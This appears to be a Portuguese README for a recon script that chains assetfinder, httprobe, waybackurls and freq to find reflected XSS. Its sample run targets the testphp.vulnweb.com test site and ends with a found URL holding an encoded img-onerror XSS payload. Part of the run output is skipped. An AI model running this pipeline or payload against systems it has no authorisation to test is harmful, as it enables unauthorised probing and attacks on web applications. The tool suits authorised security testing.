# hsctch

#Acesse o diretorio onde fez o o download o arquivo .git

#Para executar use o comando abaixo:

#python3 /root/reconx-hsctch.py 

#Digite o domínio alvo (exemplo: dominio.com.br): 

testphp.vulnweb.com




_    _  _____  _____ _______ _____ _    _
| |  | |/ ____|/ ____|__   __/ ____| |  | |
| |__| | (___ | |       | | | |    | |__| |
|  __  |\___ \| |       | | | |    |  __  |
| |  | |____) | |____   | | | |____| |  | |
|_|  |_|_____/ \_____|  |_|  \_____|_|  |_|


                                           

Executando: 

Executando assetfinder
Comando: assetfinder -subs-only testphp.vulnweb.com | anew subdomains.txt
Saída: 
Executando assetfinder concluído com sucesso.

Executando: Executando httprobe
Comando: cat subdomains.txt | httprobe | tee -a host.txt
Saída: http://testphp.vulnweb.com

Executando httprobe concluído com sucesso.
Executando: Executando waybackurls
Comando: cat host.txt | waybackurls | tee -a endpoint.txt

Executando freq para encontrar possíveis XSS concluído com sucesso.
Executando: Buscando por XSS FOUND
Comando: grep 'XSS FOUND' possible_xss.txt > resultado.txt
Saída:
Buscando por XSS FOUND concluído com sucesso.
Busca concluída.

#ls

endpoint.txt  host.txt  possible_xss.txt  resultado.txt  subdomains.txt  xss_fuzz.txt

#cat resultado.txt

XSS FOUND: http://testphp.vulnweb.com:80/hpp/index.php?pp=%22%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22


Obs: Para que o script funcione é necessário instalar os programas dos repositórios abaixo:

https://github.com/tomnomnom/assetfinder

https://github.com/takshal/freq

https://github.com/tomnomnom/waybackurls

https://github.com/tomnomnom/httprobe


